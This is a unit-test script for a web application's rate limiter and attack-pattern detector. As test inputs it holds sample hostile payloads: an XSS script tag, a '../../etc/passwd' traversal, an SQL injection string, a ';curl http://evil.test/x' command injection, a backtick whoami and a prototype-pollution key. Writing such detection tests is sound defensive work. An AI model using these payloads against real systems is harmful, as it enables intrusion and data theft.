/**
 * Offline unit checks for rate-limit + attack pattern engines
 * (no Next server required).
 */
import { spawnSync } from "node:child_process";
import { resolve, dirname } from "node:path";
import { pathToFileURL, fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const root = resolve(__dirname, "..");

export async function run() {
  console.log("\n[00] Unit: rate-limit + attack patterns");
  const rateUrl = pathToFileURL(resolve(root, "lib/security/rate-limit.ts")).href;
  const atkUrl = pathToFileURL(resolve(root, "lib/security/attack-patterns.ts")).href;
  const code = `
import { checkRateLimit, __resetRateLimitForTests, RATE_LIMIT_MAX } from "${rateUrl}";
import { detectAttack } from "${atkUrl}";
let failed = 0;
__resetRateLimitForTests();
let hit = false;
for (let i = 1; i <= RATE_LIMIT_MAX + 5; i++) {
  const r = checkRateLimit("unit-test-ip");
  if (!r.ok) {
    hit = true;
    console.log("  PASS  rate limit trips at #" + i + " — " + r.reason + " retry=" + r.retryAfterSec + "s");
    if (r.retryAfterSec < 800) { console.error("  FAIL  ban too short"); failed++; }
    break;
  }
}
if (!hit) { console.error("  FAIL  never rate limited"); failed++; }
const checks = [
  ["xss", detectAttack("<script>alert(1)</script>"), "xss"],
  ["traversal", detectAttack("../../etc/passwd"), "path_traversal"],
  ["sqli", detectAttack("1' OR 1=1 --"), "sqli"],
  ["cmd", detectAttack(";curl http://evil.test/x"), "cmd_injection"],
  ["cmd2", detectAttack(String.fromCharCode(96)+"whoami"+String.fromCharCode(96)), "cmd_injection"],
  ["proto", detectAttack("__proto__[admin]=true"), "prototype_pollution"],
  ["clean", detectAttack("/shop?q=silk"), null],
];
for (const [name, got, want] of checks) {
  if (got === want) console.log("  PASS  detect " + name);
  else { console.error("  FAIL  detect " + name + " got " + got); failed++; }
}
process.exit(failed ? 1 : 0);
`;
  const r = spawnSync(process.execPath, ["--experimental-strip-types", "--input-type=module", "-e", code], {
    encoding: "utf8",
  });
  if (r.stdout) process.stdout.write(r.stdout);
  if (r.stderr) process.stderr.write(r.stderr);
  return r.status === 0;
}

if (process.argv[1]?.endsWith("00-unit-core.mjs")) {
  process.exit((await run()) ? 0 : 1);
}
